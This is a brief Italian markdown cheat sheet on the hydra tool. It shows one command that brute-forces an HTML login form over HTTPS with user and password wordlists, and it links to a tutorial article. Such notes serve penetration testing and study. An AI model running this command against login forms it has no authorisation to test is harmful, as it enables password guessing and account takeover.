# hydra

## attacco a forza bruta di un form HTML

```
hydra test.bho https-form-post "/:user=^USER^&pass=^PASS^:Invalid" -L users.txt -P passw.txt -t 5 -w 6
```

# link-o-grafia
- https://www.html.it/articoli/attacco-brute-force-di-un-form-con-hydra/
